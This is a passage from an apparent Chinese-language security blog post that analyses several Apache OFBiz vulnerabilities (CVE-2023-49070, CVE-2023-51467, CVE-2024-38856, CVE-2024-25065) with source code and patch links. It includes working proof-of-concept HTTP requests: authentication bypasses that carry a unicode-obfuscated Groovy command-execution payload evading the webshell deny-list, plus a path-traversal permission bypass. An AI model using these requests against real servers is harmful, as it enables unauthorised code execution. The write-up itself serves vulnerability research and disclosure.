</span>4093</span><br><span class="line"></span><br><span class="line"><span class="language-handlebars"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">methodName</span>&gt;</span></span><span class="template-variable">&#123;&#123;<span class="name">Random_String</span>&#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">params</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;<span class="name">param</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;<span class="name">value</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">struct</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">member</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;<span class="name">name</span>&gt;</span></span><span class="template-variable">&#123;&#123;<span class="name">Random_String</span>&#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;<span class="name">value</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;<span class="name">serializable</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">           </span><span class="template-variable">&#123;&#123;<span class="name">Base64_Payload</span>&#125;&#125;</span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;/<span class="name">serializable</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;/<span class="name">member</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;/<span class="name">struct</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;/<span class="name">param</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;/<span class="name">params</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734404509876-d372a125-2707-4e7b-b8f2-0fad19ca5cd7.png"></p><p><font style="color:#000000;">OBFiz官方对于CVE-2023-49070的修复方式是直接移除了XML-RPC相关的逻辑</font><a href="https://github.com/apache/ofbiz-framework/commit/c59336f604f503df5b2f7c424fd5e392d5923a27">https://github.com/apache/ofbiz-framework/commit/c59336f604f503df5b2f7c424fd5e392d5923a27</a><font style="color:#000000;">，但是认证绕过的问题其实并没有处理。</font></p><h3 id="CVE-2023-51467"><a href="#CVE-2023-51467" class="headerlink" title="CVE-2023-51467"></a><font style="color:rgb(51, 51, 51);">CVE-2023-51467</font></h3><p><font style="color:#000000;">上文在分析CVE-2023-49070时，其补丁并未修复认证绕过的问题，因此导致了依旧可以利用鉴权绕过来访问任意接口。在后台中，注意到路由webtools&#x2F;control&#x2F;ProgramExport可以执行Groovy脚本。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734432201978-9aeb7a72-c23b-4099-9f5d-0c16d4c5e687.png"></p><p><font style="color:#000000;">跟进一下ProgramExport对应的视图配置，可以看到会去调用ProgramExport.groovy来执行Groovy脚本。</font></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view-map</span> <span class="attr">name</span>=<span class="string">&quot;ProgramExport&quot;</span> <span class="attr">type</span>=<span class="string">&quot;screen&quot;</span> <span class="attr">page</span>=<span class="string">&quot;component://webtools/widget/EntityScreens.xml#ProgramExport&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">screen</span> <span class="attr">name</span>=<span class="string">&quot;ProgramExport&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">section</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">actions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">set</span> <span class="attr">field</span>=<span class="string">&quot;titleProperty&quot;</span> <span class="attr">value</span>=<span class="string">&quot;PageTitleEntityExportAll&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">set</span> <span class="attr">field</span>=<span class="string">&quot;tabButtonItem&quot;</span> <span class="attr">value</span>=<span class="string">&quot;programExport&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">script</span> <span class="attr">location</span>=<span class="string">/</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;/<span class="name">actions</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;<span class="name">widgets</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;<span class="name">decorator-screen</span> <span class="attr">name</span>=<span class="string">&quot;CommonImportExportDecorator&quot;</span> <span class="attr">location</span>=<span class="string">&quot;$&#123;parameters.mainDecoratorLocation&#125;&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                <span class="tag">&lt;<span class="name">decorator-section</span> <span class="attr">name</span>=<span class="string">&quot;body&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                     <span class="tag">&lt;<span class="name">screenlet</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                        <span class="tag">&lt;<span class="name">include-form</span> <span class="attr">name</span>=<span class="string">&quot;ProgramExport&quot;</span> <span class="attr">location</span>=<span class="string">&quot;component://webtools/widget/MiscForms.xml&quot;</span>/&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                    <span class="tag">&lt;/<span class="name">screenlet</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                    <span class="tag">&lt;<span class="name">screenlet</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                        <span class="tag">&lt;<span class="name">platform-specific</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                            <span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">html-template</span> <span class="attr">location</span>=<span class="string">&quot;component://webtools/template/entity/ProgramExport.ftl&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                        <span class="tag">&lt;/<span class="name">platform-specific</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                    <span class="tag">&lt;/<span class="name">screenlet</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">                <span class="tag">&lt;/<span class="name">decorator-section</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">            <span class="tag">&lt;/<span class="name">decorator-screen</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        <span class="tag">&lt;/<span class="name">widgets</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;/<span class="name">screen</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure><p><font style="color:#000000;">在ProgramExport.groovy中，利用org.apache.ofbiz.security.SecuredUpload#isValidText方法来检测是否是Webshell。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734432652162-59c17798-e92d-4393-9fef-b9ed9fab6978.png"></p><p><font style="color:#000000;">在SecuredUpload#isValidText方法中，通过读取配置文件</font><font style="color:rgb(6, 6, 7);">来获取不允许的WebShell Token。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isValidText</span><span class="params">(String content, List&lt;String&gt; allowed)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">return</span> content != <span class="literal">null</span> ? DENIEDWEBSHELLTOKENS.stream().allMatch(token -&gt; isValid(content, token.toLowerCase(), allowed)) : <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; DENIEDWEBSHELLTOKENS = getDeniedWebShellTokens();</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> List&lt;String&gt; <span class="title function_">getDeniedWebShellTokens</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">deniedTokens</span> <span class="operator">=</span> UtilProperties.getPropertyValue(<span class="string">&quot;security&quot;</span>, <span class="string">&quot;deniedWebShellTokens&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> UtilValidate.isNotEmpty(deniedTokens) ? StringUtil.split(deniedTokens, <span class="string">&quot;,&quot;</span>) : <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734433494354-d3abea17-dda4-4429-b267-8444850a57c7.png"></p><p>简单Bypass以下即可实现RCE的目的，例如字符拼接或者编码等。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/webtools/control/ProgramExport?USERNAME=&amp;PASSWORD=&amp;token=&amp;requirePasswordChange=Y</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br, zstd</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>618</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8443</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Google Chrome&quot;;v=&quot;131&quot;, &quot;Chromium&quot;;v=&quot;131&quot;, &quot;Not_A Brand&quot;;v=&quot;24&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;macOS&quot;</span><br><span class="line"></span><br><span class="line"><span class="language-taggerscript">groovyProgram=<span class="symbol">\u006a</span><span class="symbol">\u0061</span><span class="symbol">\u0076</span><span class="symbol">\u0061</span><span class="symbol">\u002e</span><span class="symbol">\u006c</span><span class="symbol">\u0061</span><span class="symbol">\u006e</span><span class="symbol">\u0067</span><span class="symbol">\u002e</span><span class="symbol">\u0052</span><span class="symbol">\u0075</span><span class="symbol">\u006e</span><span class="symbol">\u0074</span><span class="symbol">\u0069</span><span class="symbol">\u006d</span><span class="symbol">\u0065</span><span class="symbol">\u002e</span><span class="symbol">\u0067</span><span class="symbol">\u0065</span><span class="symbol">\u0074</span><span class="symbol">\u0052</span><span class="symbol">\u0075</span><span class="symbol">\u006e</span><span class="symbol">\u0074</span><span class="symbol">\u0069</span><span class="symbol">\u006d</span><span class="symbol">\u0065</span><span class="symbol">\u0028</span><span class="symbol">\u0029</span><span class="symbol">\u002e</span><span class="symbol">\u0065</span><span class="symbol">\u0078</span><span class="symbol">\u0065</span><span class="symbol">\u0063</span><span class="symbol">\u0028</span><span class="symbol">\u0022</span><span class="symbol">\u0074</span><span class="symbol">\u006f</span><span class="symbol">\u0075</span><span class="symbol">\u0063</span><span class="symbol">\u0068</span><span class="symbol">\u0020</span><span class="symbol">\u002f</span><span class="symbol">\u0074</span><span class="symbol">\u006d</span><span class="symbol">\u0070</span><span class="symbol">\u002f</span><span class="symbol">\u0068</span><span class="symbol">\u0061</span><span class="symbol">\u0063</span><span class="symbol">\u006b</span><span class="symbol">\u0065</span><span class="symbol">\u0072</span><span class="symbol">\u0022</span><span class="symbol">\u0029</span></span></span><br></pre></td></tr></table></figure><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734434095854-7988ada2-1c70-4db6-8b60-88b141df4623.png"></p><p>官方补丁<a href="https://github.com/apache/ofbiz-framework/commit/d8b097f6717a4004acf023dfe929e0e41ad63faa#diff-68decfd4946b8ef0adcc4c7f18b938aec4a07ff7ce64609a2691ba88a4688607L426">https://github.com/apache/ofbiz-framework/commit/d8b097f6717a4004acf023dfe929e0e41ad63faa#diff-68decfd4946b8ef0adcc4c7f18b938aec4a07ff7ce64609a2691ba88a4688607L426</a>对于之前的用户名、密码等置空绕过部分进行了检测，禁止为空字符串。</p><h3 id="CVE-2024-38856"><a href="#CVE-2024-38856" class="headerlink" title="CVE-2024-38856"></a><font style="color:#000000;">CVE-2024-38856</font></h3><p><font style="color:#000000;">在RequestHandler#doRequest方法中，利用getRequestUri方法来获取请求URI的基础部分，将pathInfo按&#x2F;分割成一个字符串列表，若不为空则取第一个元素，当包含?时，取?之前部分；利用getOverrideViewUri方法来获取用于覆盖视图的URI部分，同样将pathInfo按&#x2F;分割成一个字符串列表，忽略列表中第一个元素并遍历剩余的元素（忽略~开头的元素），当包含?时，取?之前部分，将列表剩余符合元素拼接起来。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734448297486-1d615bc2-3fcc-42bc-a75d-bc5bf9a8862e.png"></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734447710724-f8334bd2-1957-4a34-b1cb-e1e8b4022b35.png"></p><p><font style="color:#000000;">在默认情况下，渲染的视图为nextRequestResponse.value，即根据路由的返回结果来自动选择视图，这里分为三种情况：</font></p><ol><li><strong><font style="color:#000000;">定义了event的路由（通常无需鉴权），会根据对应event的执行结果决定渲染类型</font></strong></li><li><strong><font style="color:#000000;">没有定义event但security中auth为true的路由，会根据认证返回结果决定渲染类型</font></strong></li><li><strong><font style="color:#000000;">既没有定义event、又缺乏认证的路由，这种会直接取配置中success的结果对应的值作为渲染类型</font></strong></li></ol><p><font style="color:#000000;">接着会校验requestUri是否需要认证，这里利用security值为true的路由来绕过检查。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734449240291-4a5c82cf-e126-40bd-a290-70d84d3e7db7.png"></p><p><font style="color:#000000;">继续往下，在runEvent方法中，通过反射调用到利用路由的业务方法，满足返回值为success即可。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734449717683-b909bbe3-3800-405c-85ad-fb38a14668ec.png"></p><p><font style="color:#000000;">接着判断nextRequestResponse.type的值，可以在配置文件中查看。</font></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">request-map</span> <span class="attr">uri</span>=<span class="string">&quot;forgotPassword&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">security</span> <span class="attr">https</span>=<span class="string">&quot;true&quot;</span> <span class="attr">auth</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">event</span> <span class="attr">type</span>=<span class="string">&quot;java&quot;</span> <span class="attr">path</span>=<span class="string">&quot;org.apache.ofbiz.securityext.login.LoginEvents&quot;</span> <span class="attr">invoke</span>=<span class="string">&quot;forgotPassword&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;view&quot;</span> <span class="attr">value</span>=<span class="string">&quot;forgotPassword&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span> <span class="attr">type</span>=<span class="string">&quot;view&quot;</span> <span class="attr">value</span>=<span class="string">&quot;forgotPassword&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;auth&quot;</span> <span class="attr">type</span>=<span class="string">&quot;request-redirect&quot;</span> <span class="attr">value</span>=<span class="string">&quot;main&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">request-map</span>&gt;</span></span><br></pre></td></tr></table></figure><p><font style="color:#000000;">进入对应的语句，可以看到，当overrideViewUri不为空，且eventReturn的值为success时，会将视图渲染为overrideViewUri。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;view&quot;</span>.equals(nextRequestResponse.type)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (Debug.verboseOn()) Debug.logVerbose(<span class="string">&quot;[RequestHandler.doRequest]: Response is a view.&quot;</span> + showSessionId(request), <span class="keyword">module</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check for an override view, only used if &quot;success&quot; = eventReturn</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">viewName</span> <span class="operator">=</span> (UtilValidate.isNotEmpty(overrideViewUri) &amp;&amp; (eventReturn == <span class="literal">null</span> || <span class="string">&quot;success&quot;</span>.equals(eventReturn))) ? overrideViewUri : nextRequestResponse.value;</span><br><span class="line">    renderView(viewName, requestMap.securityExternalView, request, response, saveName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">因此，可以利用不鉴权且路由的type为view的路由来作为requestUri的值，然后overrideViewUri设置为需要利用的路由，就可以实现前序步骤的权限校验绕过，同时将视图渲染为目标视图。同时可以利用getOverrideViewUri方法处理时的特性来绕过部分流量检测。</font></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/webtools/control/forgotPassword/~aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/ProgramExport</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br, zstd</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>52</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8443</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>https://127.0.0.1:8443</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://127.0.0.1:8443/scrum/control/login</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Google Chrome&quot;;v=&quot;131&quot;, &quot;Chromium&quot;;v=&quot;131&quot;, &quot;Not_A Brand&quot;;v=&quot;24&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;macOS&quot;</span><br><span class="line"></span><br><span class="line"><span class="language-taggerscript">groovyProgram=<span class="symbol">\u0022</span><span class="symbol">\u0074</span><span class="symbol">\u006f</span><span class="symbol">\u0075</span><span class="symbol">\u0063</span><span class="symbol">\u0068</span><span class="symbol">\u0020</span><span class="symbol">\u002f</span><span class="symbol">\u0074</span><span class="symbol">\u006d</span><span class="symbol">\u0070</span><span class="symbol">\u002f</span><span class="symbol">\u0068</span><span class="symbol">\u0061</span><span class="symbol">\u0063</span><span class="symbol">\u006b</span><span class="symbol">\u0065</span><span class="symbol">\u0072</span><span class="symbol">\u0022</span><span class="symbol">\u002e</span><span class="symbol">\u0065</span><span class="symbol">\u0078</span><span class="symbol">\u0065</span><span class="symbol">\u0063</span><span class="symbol">\u0075</span><span class="symbol">\u0074</span><span class="symbol">\u0065</span><span class="symbol">\u0028</span><span class="symbol">\u0029</span></span></span><br></pre></td></tr></table></figure><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734451330542-839667d9-0376-4ba6-adb7-6522f4a867e9.png"></p><p><font style="color:#000000;">官方补丁</font><a href="https://github.com/apache/ofbiz-framework/commit/59b42220ab642699769895ee248575154db91e62">https://github.com/apache/ofbiz-framework/commit/59b42220ab642699769895ee248575154db91e62</a><font style="color:#000000;">对漏洞触发点进行了校验。</font></p><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a><font style="color:#000000;">Privilege Escalation</font></h2><h3 id="CVE-2024-25065"><a href="#CVE-2024-25065" class="headerlink" title="CVE-2024-25065"></a>CVE-2024-25065</h3><p><font style="color:#000000;">账号的访问权限部分由org.apache.ofbiz.webapp.control.LoginWorker#hasBasePermission方法控制，先从ServletContext中获取_serverId，并获取当前请求的上下文路径，接着调用ComponentConfig#getWebAppInfo方法，很明显当info的值为null时即可跳过判断。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734437083832-a077cf34-36ae-41cf-894a-0c0cf6ce75e5.png"></p><p><font style="color:#000000;">在ComponentConfig#getWebAppInfo方法中，只需让contextRoot与wInfo.getContextRoot()不相等，即可满足返回的结果为null。</font></p><p><img src="/2024/12/18/Cursory-Analysis-Of-Apache-OFBiz/1734437403179-da32a43d-0367-4bfb-8e76-6e7845e46ece.png"></p><p><font style="color:#000000;">对于org.apache.catalina.connector.Request#getContextPath方法，返回值与match相关，只需保证candidate与canonicalContextPath相等即可让match返回true，而candidate的值是通过循环取得，每次多取一级子目录的值，并经过url解码以及normalize后即为其值。因此可以构造出这样的URL，&#x2F;h3rmesk1t&#x2F;..&#x2F;webtools&#x2F;control&#x2F;login，这样ContextPath的值中就会带上&#x2F;h3rmesk1t&#x2F;..&#x2F;，显然不会再与配置中的值相等，从而实现绕过。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">getContextPath</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">canonicalContextPath</span> <span class="operator">=</span> <span class="built_in">this</span>.getServletContext().getContextPath();</span><br><span class="line">    <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="built_in">this</span>.getRequestURI();</span><br><span class="line">    <span class="type">char</span>[] uriChars = uri.toCharArray();</span><br><span class="line">    <span class="type">int</span> <span class="variable">lastSlash</span> <span class="operator">=</span> <span class="built_in">this</span>.mappingData.contextSlashCount;</span><br><span class="line">    <span class="keyword">if</span> (lastSlash == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> pos;</span><br><span class="line">        <span class="keyword">for</span>(pos = <span class="number">0</span>; lastSlash &gt; <span class="number">0</span>; --lastSlash) &#123;</span><br><span class="line">            pos = <span class="built_in">this</span>.nextSlash(uriChars, pos + <span class="number">1</span>);</span><br><span class="line">            